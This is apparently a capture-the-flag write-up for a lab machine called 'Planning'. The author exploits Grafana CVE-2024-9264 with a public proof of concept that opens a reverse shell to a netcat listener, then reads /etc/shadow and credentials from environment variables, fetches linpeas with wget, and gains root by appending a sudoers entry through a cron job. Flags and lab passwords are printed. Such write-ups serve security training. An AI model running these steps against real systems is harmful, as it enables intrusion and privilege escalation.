# Title : Planning

## Intro

```bash

Machine Information

As is common in real life pentests, you will start the Planning box with credentials for the following account: admin / 0D5oT70Fq13EvB5r

```


## Recon

### Port  scanning

```bash

$ nmap -sV -sC -Pn -A 10.10.11.68    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-01 11:35 WAT
Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 100.00% done; ETC: 11:36 (0:00:00 remaining)
Nmap scan report for 10.10.11.68
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   233.69 ms 10.10.14.1
2   233.77 ms 10.10.11.68

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.11 seconds

```

- i add `http://planning.htb/` to `/etc/hosts`

```bash

sudo echo "10.10.11.68     planning.htb" >> /etc/hosts

```


### Enumeration

```bash

$ gobuster dir  -u http://planning.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://planning.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/js                   (Status: 301) [Size: 178] [--> http://planning.htb/js/]
/css                  (Status: 301) [Size: 178] [--> http://planning.htb/css/]
/img                  (Status: 301) [Size: 178] [--> http://planning.htb/img/]
/lib                  (Status: 301) [Size: 178] [--> http://planning.htb/lib/]
Progress: 56162 / 56163 (100.00%)
===============================================================
Finished
===============================================================
                                                                 
```

### subdomain Enumeration


```bash

i found grafana  a subdomain


```
- I added it to my `/etc/hosts`

- I used the credentials to get inititial accesss 

### Initial Access

```bash

login with username and password  

admin / 0D5oT70Fq13EvB5r

```
- it vulnerable with cve of `CVE-2024-9264`

- i make use of `https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit` to exploit it


- i clone it

```bash

$ git clone https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit.git 
Cloning into 'CVE-2024-9264-RCE-Exploit'...
remote: Enumerating objects: 15, done.
remote: Counting objects: 100% (15/15), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 15 (delta 6), reused 4 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (15/15), 5.73 KiB | 1.91 MiB/s, done.
Resolving deltas: 100% (6/6), done.

$ cd CVE-2024-9264-RCE-Exploit 


```

- make  use of the exploit

```bash

$ python poc.py --url http://grafana.planning.htb/ --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.54 --reverse-port 9001
[SUCCESS] Login successful!
Reverse shell payload sent successfully!
Set up a netcat listener on 9001


```



- i start the my listener on port 4444

```bash

$ nc -lvnp 9001                   
listening on [any] 9001 ...
connect to [10.10.14.54] from (UNKNOWN) [10.10.11.68] 52164
sh: 0: can't access tty; job control turned off
# 



```

```bash

root@7ce659d667d7:~# env
env
AWS_AUTH_SESSION_DURATION=15m
HOSTNAME=7ce659d667d7
PWD=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_HOME=/usr/share/grafana
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
HOME=/usr/share/grafana
AWS_AUTH_EXTERNAL_ID=
SHLVL=2
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
root@7ce659d667d7:~# 

```


-  base on my research it using a  docker


```bash

root@7ce659d667d7:~# cat /etc/hosts
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.17.0.2	7ce659d667d7

root@7ce659d667d7:~# cat /etc/shadow

root:*:19840:0:99999:7:::
daemon:*:19840:0:99999:7:::
bin:*:19840:0:99999:7:::
sys:*:19840:0:99999:7:::
sync:*:19840:0:99999:7:::
games:*:19840:0:99999:7:::
man:*:19840:0:99999:7:::
lp:*:19840:0:99999:7:::
mail:*:19840:0:99999:7:::
news:*:19840:0:99999:7:::
uucp:*:19840:0:99999:7:::
proxy:*:19840:0:99999:7:::
www-data:*:19840:0:99999:7:::
backup:*:19840:0:99999:7:::
list:*:19840:0:99999:7:::
irc:*:19840:0:99999:7:::
gnats:*:19840:0:99999:7:::
nobody:*:19840:0:99999:7:::
_apt:*:19840:0:99999:7:::
grafana:*:19857:0:99999:7:::

```

- i using the details to login in through ssh

```bash

GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo

```

- i get access to `enzo` through ssh

```bash

ssh enzo@planning.htb   
enzo@planning.htb's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Aug  1 01:15:48 PM UTC 2025

  System load:  0.29              Processes:             353
  Usage of /:   73.3% of 6.30GB   Users logged in:       0
  Memory usage: 44%               IPv4 address for eth0: 10.10.11.68
  Swap usage:   14%

  => There are 95 zombie processes.


Expanded Security Maintenance for Applications is not enabled.

102 updates can be applied immediately.
77 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Aug 1 13:15:49 2025 from 10.10.14.54
enzo@planning:~$ 



```


### user flag 


```bash 

enzo@planning:~$ ls
user.txt
enzo@planning:~$ cat user.txt 
3c3a849b3e76b17063da2badb0561941
enzo@planning:~$ 

```

- to gain access to the root, i start by enumerating and i find this 

## Priv escalation 

```bash


$ python3 -m http.server 

```

- on the target machine

```bash

$ wget 10.10.16.29:8000/linpeas.sh

$ chmod +x  ./linpeas.sh

```

- Run it then looked through 

```bash

$ ./linpeas.sh


```

- after going through it, i saw something

```bash
╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /opt/crontabs/crontab.db: New Line Delimited JSON text data
Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 5, database pages 967, cookie 0x4, schema 4, UTF-8, version-valid-for 5
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 6, database pages 16, cookie 0x5, schema 4, UTF-8, version-valid-for 6
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 5, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 5


```

- the i go to the file, which gave me another attack vector


```bash

enzo@planning:~$ cat /opt/crontabs/crontab.db | jq
{
  "name": "Grafana backup",
  "command": "/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz",
  "schedule": "@daily",
  "stopped": false,
  "timestamp": "Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740774983276,
  "saved": false,
  "_id": "GTI22PpoJNtRKg0W"
}
{
  "name": "Cleanup",
  "command": "/root/scripts/cleanup.sh",
  "schedule": "* * * * *",
  "stopped": false,
  "timestamp": "Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740849309992,
  "saved": false,
  "_id": "gNIRXh1WIc9K7BYX"
}


```
- whic i found a password "P4ssw0rdS0pRi0T3c"
- which i found that password isn't for the admin

```bash
enzo@planning:~$ su root
Password: 
su: Authentication failure
enzo@planning:~$ 

```

- some service where running on localhost

```bash
enzo@planning:~$ cat log.txt | grep "tcp"
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:42993         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcpdump is available
tcpdump version 4.99.4
uid=105(tcpdump) gid=107(tcpdump) groups=107(tcpdump)
-rw-r--r-- 1 root root  1687 Feb 16 21:04 usr.bin.tcpdump
-rwxr-xr-x 1 root root 1086 Mar 10  2024 /usr/src/linux-headers-6.8.0-59/tools/testing/selftests/net/tcp_fastopen_backup_key.sh

```

- so i go forward by doing port for forwading via SSH

```bash

 ssh -L 1337:localhost:8000 enzo@planning.htb
enzo@planning.htb's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Aug  2 06:34:00 PM UTC 2025

  System load:  0.0               Processes:             270
  Usage of /:   66.6% of 6.30GB   Users logged in:       1
  Memory usage: 51%               IPv4 address for eth0: 10.10.11.68
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

102 updates can be applied immediately.
77 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat Aug 2 18:34:01 2025 from 10.10.14.125
enzo@planning:~$ whoami
enzo

```

- so we proced by access it via http://localhost:1337/

- we can login via the crediatial we found `root/P4ssw0rdS0pRi0T3c`

- After getting access, we can see it a cronjob  so we have to do priv escalation via the cronjob

- we have to create a new cronjob and has it to execute it 


```bash

echo "enzo ALL=(ALL:ALL) ALL" >> /etc/sudoers

```
- and save it without set any time
- i click on run 
- After running the cron job, i checked sudo privileges:

```bash
enzo@planning:~$ sudo -l
[sudo] password for enzo: 
Matching Defaults entries for enzo on planning:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User enzo may run the following commands on planning:
    (ALL : ALL) ALL
enzo@planning:~$ 

```

# Root Access

```bash
enzo@planning:~$ sh
$ id
uid=1000(enzo) gid=1000(enzo) groups=1000(enzo)
$ su
Password: 
su: Authentication failure
$ sudo -l
Matching Defaults entries for enzo on planning:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User enzo may run the following commands on planning:
    (ALL : ALL) ALL
$ sudo -i
root@planning:~# cd /root
root@planning:~# cat root.txt 
71aeb9185203c408c93742d525fedeb0
root@planning:~# 


```